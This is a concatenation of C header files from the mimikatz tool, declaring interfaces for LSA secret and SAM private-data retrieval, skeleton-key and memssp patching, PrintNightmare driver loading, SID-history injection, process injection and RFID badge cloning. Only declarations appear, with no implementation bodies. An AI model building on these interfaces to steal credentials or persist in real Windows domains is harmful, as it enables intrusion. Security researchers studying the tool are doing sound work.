typedef NTSTATUS	(WINAPI * PSAMIGETPRIVATEDATA) (IN SAMPR_HANDLE UserHandle, IN PDWORD DataType, OUT DWORD *unk, OUT DWORD *BufferSize, OUT struct _KIWI_LSA_PRIVATE_DATA **Buffer);

typedef NTSTATUS	(WINAPI * PSAMROPENDOMAIN) (IN SAMPR_HANDLE SamHandle, IN ACCESS_MASK DesiredAccess, IN PSID DomainId, OUT SAMPR_HANDLE *DomainHandle);
typedef NTSTATUS	(WINAPI * PSAMROPENUSER) (IN SAMPR_HANDLE DomainHandle, IN ACCESS_MASK DesiredAccess, IN DWORD UserId, OUT SAMPR_HANDLE *UserHandle);
typedef NTSTATUS	(WINAPI * PSAMRQUERYINFORMATIONUSER) (IN SAMPR_HANDLE UserHandle, IN USER_INFORMATION_CLASS UserInformationClass, OUT PSAMPR_USER_INFO_BUFFER *Buffer);
typedef VOID		(WINAPI * PSAMIFREE_SAMPR_USER_INFO_BUFFER) (IN PSAMPR_USER_INFO_BUFFER, IN USER_INFORMATION_CLASS UserInformationClass);

typedef LPVOID		(WINAPI * PVIRTUALALLOC) (__in_opt LPVOID lpAddress, __in     SIZE_T dwSize, __in     DWORD flAllocationType, __in     DWORD flProtect);
typedef HLOCAL		(WINAPI * PLOCALALLOC) (__in UINT uFlags, __in SIZE_T uBytes);
typedef HLOCAL		(WINAPI * PLOCALFREE) (__deref HLOCAL hMem);
typedef PVOID		(__cdecl * PMEMCPY) (__out_bcount_full_opt(_MaxCount) void * _Dst, __in_bcount_opt(_MaxCount) const void * _Src, __in size_t _MaxCount);

typedef NTSTATUS	(NTAPI * PLSAOPENPOLICY) (__in_opt PLSA_UNICODE_STRING SystemName, __in PLSA_OBJECT_ATTRIBUTES ObjectAttributes, __in ACCESS_MASK DesiredAccess, __out PLSA_HANDLE PolicyHandle);
typedef NTSTATUS	(NTAPI * PLSACLOSE) (__in LSA_HANDLE ObjectHandle);
typedef NTSTATUS	(NTAPI * PLSAFREEMEMORY) (__in_opt PVOID Buffer);
typedef NTSTATUS	(NTAPI * PLSARETRIEVEPRIVATEDATA) (__in LSA_HANDLE PolicyHandle, __in PLSA_UNICODE_STRING KeyName, __out PLSA_UNICODE_STRING * PrivateData);

DWORD WINAPI kuhl_sekurlsa_samsrv_thread(PREMOTE_LIB_DATA lpParameter);
DWORD kuhl_sekurlsa_samsrv_thread_end();

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "kuhl_m.h"
//#include "../modules/kull_m_process.h"

const KUHL_M kuhl_m_minesweeper;

NTSTATUS kuhl_m_minesweeper_infos(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_minesweeper_bsod(int argc, wchar_t * argv[]);

typedef struct _STRUCT_MINESWEEPER_REF_ELEMENT {
	DWORD cbElements;
	DWORD unk0;
	DWORD unk1;
	PVOID elements;
	DWORD unk2;
	DWORD unk3;
} STRUCT_MINESWEEPER_REF_ELEMENT, *PSTRUCT_MINESWEEPER_REF_ELEMENT;

typedef struct _STRUCT_MINESWEEPER_BOARD {
	PVOID Serializer;
	DWORD cbMines;
	DWORD cbRows;
	DWORD cbColumns;
	DWORD unk0;
	DWORD unk1;
	DWORD unk2;
	DWORD unk3;
	DWORD unk4;
	DWORD unk5;
	DWORD unk6;
	DWORD unk7;
	DWORD unk8;
	DWORD unk9;
	PVOID unk10;
	PVOID unk11;
	PSTRUCT_MINESWEEPER_REF_ELEMENT	ref_visibles;
	PSTRUCT_MINESWEEPER_REF_ELEMENT	ref_mines;
	DWORD unk12;
	DWORD unk13;
} STRUCT_MINESWEEPER_BOARD, *PSTRUCT_MINESWEEPER_BOARD;

typedef struct _STRUCT_MINESWEEPER_GAME {
	PVOID Serializer;
	//PVOID pGameStat; on 7x86
	PVOID pNodeBase;
	PVOID pBoardCanvas;
	PSTRUCT_MINESWEEPER_BOARD pBoard;
	PSTRUCT_MINESWEEPER_BOARD pBoard_WIN7x86;
} STRUCT_MINESWEEPER_GAME, *PSTRUCT_MINESWEEPER_GAME;

void kuhl_m_minesweeper_infos_parseField(PKULL_M_MEMORY_HANDLE hMemory, PSTRUCT_MINESWEEPER_REF_ELEMENT base, CHAR ** field, BOOL isVisible);
//
//void __fastcall kuhl_m_minesweeper_bsod_thread(PVOID a, INT b, INT c, BOOL d);
//DWORD kuhl_m_minesweeper_bsod_thread_end();

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "kuhl_m.h"
//#include "../../modules/kull_m_process.h"
//#include "../../modules/kull_m_memory.h"
//#include "../../modules/kull_m_patch.h"
//#include "../../modules/kull_m_file.h"
//#include "../../modules/kull_m_net.h"
//#include "../../modules/kull_m_remotelib.h"
//#include "../../modules/kull_m_crypto_system.h"
//#include "../../modules/kull_m_crypto_ngc.h"
//#include "../../modules/rpc/kull_m_rpc_ms-rprn.h"
//#include "../../modules/rpc/kull_m_rpc_ms-par.h"
//#include "../../modules/rpc/kull_m_rpc_ms-efsr.h"


const KUHL_M kuhl_m_misc;

NTSTATUS kuhl_m_misc_cmd(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_misc_regedit(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_misc_taskmgr(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_misc_ncroutemon(int argc, wchar_t * argv[]);
#if !defined(_M_ARM64)
NTSTATUS kuhl_m_misc_detours(int argc, wchar_t * argv[]);
#endif
//NTSTATUS kuhl_m_misc_addsid(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_misc_memssp(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_misc_skeleton(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_misc_compress(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_misc_lock(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_misc_wp(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_misc_mflt(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_misc_easyntlmchall(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_misc_clip(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_misc_xor(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_misc_aadcookie(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_misc_aadcookie_NgcSignWithSymmetricPopKey(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_misc_spooler(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_misc_efs(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_misc_printnightmare(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_misc_sccm_accounts(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_misc_shadowcopies(int argc, wchar_t * argv[]);

BOOL kuhl_m_misc_printnightmare_normalize_library(BOOL bIsPar, LPCWSTR szLibrary, LPWSTR *pszNormalizedLibrary, LPWSTR *pszShortLibrary);
BOOL kuhl_m_misc_printnightmare_FillStructure(PDRIVER_INFO_2 pInfo2, BOOL bIsX64, BOOL bIsDynamic, LPCWSTR szForce, BOOL bIsPar, handle_t hRemoteBinding);
void kuhl_m_misc_printnightmare_ListPrintersAndMaybeDelete(BOOL bIsPar, handle_t hRemoteBinding, LPCWSTR szEnvironment, BOOL bIsDelete);
BOOL kuhl_m_misc_printnightmare_AddPrinterDriver(BOOL bIsPar, handle_t hRemoteBinding, PDRIVER_INFO_2 pInfo2, DWORD dwFlags);
BOOL kuhl_m_misc_printnightmare_DeletePrinterDriver(BOOL bIsPar, handle_t hRemoteBinding, LPCWSTR szEnvironment, LPCWSTR pName);
BOOL kuhl_m_misc_printnightmare_EnumPrinters(BOOL bIsPar, handle_t hRemoteBinding, LPCWSTR szEnvironment, _PDRIVER_INFO_2 *ppDriverInfo, DWORD *pcReturned);

BOOL CALLBACK kuhl_m_misc_detours_callback_process(PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation, PVOID pvArg);
BOOL CALLBACK kuhl_m_misc_detours_callback_module(PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION pModuleInformation, PVOID pvArg);
BOOL CALLBACK kuhl_m_misc_detours_callback_module_exportedEntry(PKULL_M_PROCESS_EXPORTED_ENTRY pExportedEntryInformations, PVOID pvArg);
BOOL CALLBACK kuhl_m_misc_detours_callback_module_name_addr(PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION pModuleInformation, PVOID pvArg);

typedef struct _KUHL_M_MISC_DETOURS_HOOKS {
	DWORD minLevel;
	PBYTE pattern;
	DWORD szPattern;
	DWORD offsetToRead;
	DWORD szToRead;
	BOOL isRelative;
	BOOL isTarget;
} KUHL_M_MISC_DETOURS_HOOKS, *PKUHL_M_MISC_DETOURS_HOOKS;

PBYTE kuhl_m_misc_detours_testHookDestination(PKULL_M_MEMORY_ADDRESS base, WORD machineOfProcess, DWORD level);
BOOL kuhl_m_misc_generic_nogpo_patch(PCWSTR commandLine, PWSTR disableString, SIZE_T szDisableString, PWSTR enableString, SIZE_T szEnableString);

#if !defined(NTDSAPI)
#define NTDSAPI DECLSPEC_IMPORT
#endif
NTDSAPI DWORD WINAPI DsBindW(IN OPTIONAL LPCWSTR DomainControllerName, IN OPTIONAL LPCWSTR DnsDomainName, OUT HANDLE *phDS);
NTDSAPI DWORD WINAPI DsAddSidHistoryW(IN HANDLE hDS, IN DWORD Flags, IN LPCWSTR SrcDomain, IN LPCWSTR SrcPrincipal, IN OPTIONAL LPCWSTR SrcDomainController, IN OPTIONAL RPC_AUTH_IDENTITY_HANDLE SrcDomainCreds, IN LPCWSTR DstDomain, IN LPCWSTR DstPrincipal);
NTDSAPI DWORD WINAPI DsUnBindW(IN HANDLE *phDS);

typedef BOOL	(WINAPI * PLOCKWORKSTATION) (VOID);
typedef BOOL	(WINAPI * PSYSTEMPARAMETERSINFOW) (__in UINT uiAction, __in UINT uiParam, __inout_opt PVOID pvParam, __in UINT fWinIni);
typedef DWORD	(WINAPI * PGETLASTERROR) (VOID);

typedef struct _KIWI_WP_DATA {
	UNICODE_STRING process;
	PCWCHAR wp;
} KIWI_WP_DATA, *PKIWI_WP_DATA;

BOOL CALLBACK kuhl_m_misc_lock_callback(PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation, PVOID pvArg);
void kuhl_m_misc_lock_for_pid(DWORD pid, PCWCHAR wp);
BOOL CALLBACK kuhl_m_misc_wp_callback(PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation, PVOID pvArg);
void kuhl_m_misc_wp_for_pid(DWORD pid, PCWCHAR wp);
void kuhl_m_misc_mflt_display(PFILTER_AGGREGATE_BASIC_INFORMATION info);

BOOL WINAPI kuhl_misc_clip_WinHandlerRoutine(DWORD dwCtrlType);
LRESULT APIENTRY kuhl_m_misc_clip_MainWndProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

#ifndef __proofofpossessioncookieinfo_h__
#define __proofofpossessioncookieinfo_h__

#ifndef __IProofOfPossessionCookieInfoManager_FWD_DEFINED__
#define __IProofOfPossessionCookieInfoManager_FWD_DEFINED__
typedef interface IProofOfPossessionCookieInfoManager IProofOfPossessionCookieInfoManager;
#endif

typedef struct ProofOfPossessionCookieInfo {
	LPWSTR name;
	LPWSTR data;
	DWORD flags;
	LPWSTR p3pHeader;
} ProofOfPossessionCookieInfo;

typedef struct IProofOfPossessionCookieInfoManagerVtbl {
	BEGIN_INTERFACE
	HRESULT (STDMETHODCALLTYPE *QueryInterface)(IProofOfPossessionCookieInfoManager * This, REFIID riid, __RPC__deref_out  void **ppvObject);
	ULONG (STDMETHODCALLTYPE *AddRef)(__RPC__in IProofOfPossessionCookieInfoManager * This);
	ULONG (STDMETHODCALLTYPE *Release)(__RPC__in IProofOfPossessionCookieInfoManager * This);
	HRESULT (STDMETHODCALLTYPE *GetCookieInfoForUri)(__RPC__in IProofOfPossessionCookieInfoManager * This, __RPC__in LPCWSTR uri, __RPC__out DWORD *cookieInfoCount, __RPC__deref_out_ecount_full_opt(*cookieInfoCount) ProofOfPossessionCookieInfo **cookieInfo);
	END_INTERFACE
} IProofOfPossessionCookieInfoManagerVtbl;

interface IProofOfPossessionCookieInfoManager {
	CONST_VTBL struct IProofOfPossessionCookieInfoManagerVtbl *lpVtbl;
};

#define IProofOfPossessionCookieInfoManager_QueryInterface(This,riid,ppvObject)							( (This)->lpVtbl -> QueryInterface(This,riid,ppvObject) )
#define IProofOfPossessionCookieInfoManager_AddRef(This)												( (This)->lpVtbl -> AddRef(This) )
#define IProofOfPossessionCookieInfoManager_Release(This)												( (This)->lpVtbl -> Release(This) )
#define IProofOfPossessionCookieInfoManager_GetCookieInfoForUri(This,uri,cookieInfoCount,cookieInfo)	( (This)->lpVtbl -> GetCookieInfoForUri(This,uri,cookieInfoCount,cookieInfo) )

#endif

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "kuhl_m.h"
//#include "lsadump/kuhl_m_lsadump_dc.h"
//#include "../../modules/kull_m_ldap.h"
//#include "../../modules/kull_m_net.h"
//#include "../../modules/kull_m_token.h"
//#include "../../modules/rpc/kull_m_rpc_ms-dcom_IObjectExporter.h"


const KUHL_M kuhl_m_net;

NTSTATUS kuhl_m_net_user(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_net_group(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_net_alias(int argc, wchar_t * argv[]);

void kuhl_m_net_simpleLookup(SAMPR_HANDLE hDomainHandle, DWORD rid);

NTSTATUS kuhl_m_net_autoda(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_net_session(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_net_wsession(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_net_tod(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_net_stats(int argc, wchar_t * argv[]);

void kuhl_m_net_share_type(DWORD type);

NTSTATUS kuhl_m_net_share(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_net_serverinfo(int argc, wchar_t * argv[]);

NTSTATUS kuhl_m_net_trust(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_net_deleg(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_net_dcom_if(int argc, wchar_t * argv[]);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "kuhl_m.h"
//#include "../modules/kull_m_process.h"

const KUHL_M kuhl_m_privilege;

NTSTATUS kuhl_m_privilege_debug(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_privilege_driver(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_privilege_security(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_privilege_tcb(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_privilege_backup(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_privilege_restore(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_privilege_sysenv(int argc, wchar_t * argv[]);

NTSTATUS kuhl_m_privilege_id(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_privilege_name(int argc, wchar_t * argv[]);

NTSTATUS kuhl_m_privilege_simple(ULONG privId);

#define SE_CREATE_TOKEN				2
#define SE_ASSIGNPRIMARYTOKEN		3
#define SE_LOCK_MEMORY				4
#define SE_INCREASE_QUOTA			5
#define SE_UNSOLICITED_INPUT		6
#define SE_TCB						7
#define SE_SECURITY					8
#define SE_TAKE_OWNERSHIP			9
#define SE_LOAD_DRIVER				10
#define SE_SYSTEM_PROFILE			11
#define SE_SYSTEMTIME				12
#define SE_PROF_SINGLE_PROCESS		13
#define SE_INC_BASE_PRIORITY		14
#define SE_CREATE_PAGEFILE			15
#define SE_CREATE_PERMANENT			16
#define SE_BACKUP					17
#define SE_RESTORE					18
#define SE_SHUTDOWN					19
#define SE_DEBUG					20
#define SE_AUDIT					21
#define SE_SYSTEM_ENVIRONMENT		22
#define SE_CHANGE_NOTIFY			23
#define SE_REMOTE_SHUTDOWN			24
#define SE_UNDOCK					25
#define SE_SYNC_AGENT				26
#define SE_ENABLE_DELEGATION		27
#define SE_MANAGE_VOLUME			28
#define SE_IMPERSONATE				29
#define SE_CREATE_GLOBAL			30
#define SE_TRUSTED_CREDMAN_ACCESS	31
#define SE_RELABEL					32
#define SE_INC_WORKING_SET			33
#define SE_TIME_ZONE				34
#define SE_CREATE_SYMBOLIC_LINK		35

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "kuhl_m.h"
//#include "../modules/kull_m_process.h"
//#include "kuhl_m_token.h"

const KUHL_M kuhl_m_process;

typedef BOOL	(WINAPI * PINITIALIZEPROCTHREADATTRIBUTELIST) (__out_xcount_opt(*lpSize) LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList, __in DWORD dwAttributeCount, __reserved DWORD dwFlags, __inout PSIZE_T lpSize);
typedef VOID	(WINAPI * PDELETEPROCTHREADATTRIBUTELIST) (__inout LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList);
typedef BOOL	(WINAPI * PUPDATEPROCTHREADATTRIBUTE) (__inout LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList, __in DWORD dwFlags, __in DWORD_PTR Attribute, __in_bcount_opt(cbSize) PVOID lpValue, __in SIZE_T cbSize, __out_bcount_opt(cbSize) PVOID lpPreviousValue, __in_opt PSIZE_T lpReturnSize);

typedef enum _KUHL_M_PROCESS_GENERICOPERATION {
	KUHL_M_PROCESS_GENERICOPERATION_TERMINATE,
	KUHL_M_PROCESS_GENERICOPERATION_SUSPEND,
	KUHL_M_PROCESS_GENERICOPERATION_RESUME,
} KUHL_M_PROCESS_GENERICOPERATION, *PKUHL_M_PROCESS_GENERICOPERATION;

NTSTATUS kuhl_m_process_genericOperation(int argc, wchar_t * argv[], KUHL_M_PROCESS_GENERICOPERATION operation);

NTSTATUS kuhl_m_process_list(int argc, wchar_t * argv[]);
BOOL CALLBACK kuhl_m_process_list_callback_process(PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation, PVOID pvArg);

NTSTATUS kuhl_m_process_callbackProcess(int argc, wchar_t * argv[], PKULL_M_MODULE_ENUM_CALLBACK callback);

NTSTATUS kuhl_m_process_exports(int argc, wchar_t * argv[]);
BOOL CALLBACK kuhl_m_process_exports_callback_module(PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION pModuleInformation, PVOID pvArg);
BOOL CALLBACK kuhl_m_process_exports_callback_module_exportedEntry(PKULL_M_PROCESS_EXPORTED_ENTRY pExportedEntryInformations, PVOID pvArg);

NTSTATUS kuhl_m_process_imports(int argc, wchar_t * argv[]);
BOOL CALLBACK kuhl_m_process_imports_callback_module(PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION pModuleInformation, PVOID pvArg);
BOOL CALLBACK kuhl_m_process_imports_callback_module_importedEntry(PKULL_M_PROCESS_IMPORTED_ENTRY pImportedEntryInformations, PVOID pvArg);

NTSTATUS kuhl_m_process_start(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_process_stop(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_process_suspend(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_process_resume(int argc, wchar_t * argv[]);

BOOL kull_m_process_run_data(LPCWSTR commandLine, HANDLE hToken);
NTSTATUS kuhl_m_process_run(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_process_runParent(int argc, wchar_t * argv[]);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "kuhl_m.h"
//#include "../../modules/kull_m_rdm.h"

const KUHL_M kuhl_m_rdm;

NTSTATUS kuhl_m_rdm_version(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_rdm_list(int argc, wchar_t * argv[]);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "kuhl_m.h"
//#include "../mimikatz.h"
//#include "../../modules/rpc/kull_m_rpc_mimicom.h"

const KUHL_M kuhl_m_rpc;

NTSTATUS kuhl_m_c_rpc_init();
NTSTATUS kuhl_m_c_rpc_clean();

NTSTATUS kuhl_m_rpc_server(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_rpc_connect(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_rpc_enum(int argc, wchar_t * argv[]);

NTSTATUS kuhl_m_rpc_close(int argc, wchar_t * argv[]);

NTSTATUS kuhl_m_rpc_do(wchar_t * input);

typedef struct _KUHL_M_RPC_SERVER_INF {
	PWSTR szProtSeq;
	PWSTR szEndpoint;
	PWSTR szService;
	BOOL publishMe;
	RPC_IF_HANDLE srvif;
	DWORD AuthnSvc;
	DWORD flags;
	RPC_IF_CALLBACK_FN *sec;
} KUHL_M_RPC_SERVER_INF, *PKUHL_M_RPC_SERVER_INF;


//DWORD WINAPI kuhl_m_rpc_server_start(LPVOID lpThreadParameter);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "kuhl_m.h"
//#include "../modules/kull_m_service.h"
//#include "../modules/kull_m_file.h"
//#include "kuhl_m_service_remote.h"

const KUHL_M kuhl_m_service;

NTSTATUS kuhl_m_c_service_init();
NTSTATUS kuhl_m_c_service_clean();

typedef BOOL (* KUHL_M_SERVICE_FUNC) (PCWSTR serviceName);
NTSTATUS genericFunction(KUHL_M_SERVICE_FUNC function, wchar_t * text, int argc, wchar_t * argv[], DWORD dwControl);

NTSTATUS kuhl_m_service_start(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_service_remove(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_service_stop(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_service_suspend(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_service_resume(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_service_preshutdown(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_service_shutdown(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_service_list(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_service_installme(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_service_uninstallme(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_service_me(int argc, wchar_t * argv[]);

void WINAPI kuhl_m_service_CtrlHandler(DWORD Opcode);
void WINAPI kuhl_m_service_Main(DWORD argc, LPTSTR *argv);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "kuhl_m_service.h"
#if defined(SERVICE_INCONTROL)
//#include "../modules/kull_m_remotelib.h"
//#include "../modules/kull_m_patch.h"

typedef DWORD ( __stdcall * PSCSENDCONTROL_STD)	(LPCWSTR lpServiceName, PVOID arg1, PVOID arg2, int arg3, DWORD dwControl, DWORD arg4, PVOID arg5, DWORD arg6, PVOID arg7, DWORD arg8, DWORD arg9, PVOID arg10, PVOID arg11, PVOID arg12);
typedef DWORD (__fastcall * PSCSENDCONTROL_FAST)(LPCWSTR lpServiceName, PVOID arg1, PVOID arg2, int arg3, DWORD dwControl, DWORD arg4, PVOID arg5, DWORD arg6, PVOID arg7, DWORD arg8, DWORD arg9, PVOID arg10, PVOID arg11, PVOID arg12);

DWORD WINAPI kuhl_service_sendcontrol_std_thread(PREMOTE_LIB_DATA lpParameter);
DWORD kuhl_service_sendcontrol_std_thread_end();
DWORD WINAPI kuhl_service_sendcontrol_fast_thread(PREMOTE_LIB_DATA lpParameter);
DWORD kuhl_service_sendcontrol_fast_thread_end();

BOOL kuhl_service_sendcontrol_inprocess(PWSTR ServiceName, DWORD dwControl);
#endif

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "kuhl_m.h"
//#include "../modules/kull_m_ldap.h"
//#include "../modules/kull_m_token.h"
//#include "../modules/kull_m_service.h"
//#include "../modules/kull_m_patch.h"

const KUHL_M kuhl_m_sid;

NTSTATUS kuhl_m_sid_lookup(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_sid_query(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_sid_modify(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_sid_add(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_sid_clear(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_sid_patch(int argc, wchar_t * argv[]);

void kuhl_m_sid_displayMessage(PLDAP ld, PLDAPMessage pMessage);
BOOL kuhl_m_sid_quickSearch(int argc, wchar_t * argv[], BOOL needUnique, PCWCHAR system, PLDAP *ld, PLDAPMessage *pMessage);
PWCHAR kuhl_m_sid_filterFromArgs(int argc, wchar_t * argv[]);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "kuhl_m.h"
//#include "../../modules/kull_m_sr98.h"

const KUHL_M kuhl_m_sr98;

NTSTATUS kuhl_m_sr98_beep(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_sr98_raw(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_sr98_b0(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_sr98_list(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_sr98_hid26(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_sr98_em4100(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_sr98_noralsy(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_sr98_nedap(int argc, wchar_t * argv[]);

#define C_FIXED0	0x71
#define C_FIXED1	0x40
#define C_UNK0		0x00
#define C_UNK1		0x00

typedef struct _KUHL_M_SR98_RAW_BLOCK {
	UCHAR toProg;
	ULONG data;
} KUHL_M_SR98_RAW_BLOCK, *PKUHL_M_SR98_RAW_BLOCK;

BOOL kuhl_m_sr98_sendBlocks(ULONG *blocks, UCHAR nb);
void kuhl_m_sr98_b0_descr(ULONG b0);

UCHAR kuhl_m_sr98_hid26_Manchester_4bits(UCHAR data4);
void kuhl_m_sr98_hid26_blocks(ULONG blocks[4], UCHAR FacilityCode, USHORT CardNumber, PULONGLONG pWiegand);

void kuhl_m_sr98_em4100_blocks(ULONG blocks[3], ULONGLONG CardNumber);

void kuhl_m_sr98_noralsy_blocks(ULONG blocks[4], ULONG CardNumber, USHORT Year);

USHORT kuhl_m_sr98_crc16_ccitt_1021(const UCHAR *data, ULONG len);
void kuhl_m_sr98_nedap_blocks(ULONG blocks[5], BOOLEAN isLong, UCHAR SubType, USHORT CustomerCode, ULONG CardNumber);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "kuhl_m.h"
//#include "../../modules/kull_m_string.h"
//#include "../../modules/kull_m_file.h"
//#include "../../modules/kull_m_process.h"
//#include "../../modules/kull_m_net.h"
//#include "../../modules/kull_m_cabinet.h"

const KUHL_M kuhl_m_standard;

NTSTATUS kuhl_m_standard_cls(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_standard_exit(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_standard_cite(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_standard_answer(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_standard_coffee(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_standard_sleep(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_standard_log(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_standard_base64(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_standard_version(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_standard_cd(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_standard_localtime(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_standard_hostname(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_standard_test(int argc, wchar_t * argv[]);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "kuhl_m.h"
//#include "../modules/kull_m_string.h"

const KUHL_M kuhl_m_sysenv;

NTSTATUS kuhl_m_sysenv_list(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_sysenv_get(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_sysenv_set(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_sysenv_del(int argc, wchar_t * argv[]);

void kuhl_m_sysenv_display_attributes(DWORD attributes);
void kuhl_m_sysenv_display_vendorGuid(LPCGUID guid);

typedef struct _KUHL_M_SYSENV_GUID_STORE {
	const GUID guid;
	LPCWSTR name;
} KUHL_M_SYSENV_GUID_STORE, *PKUHL_M_SYSENV_GUID_STORE;

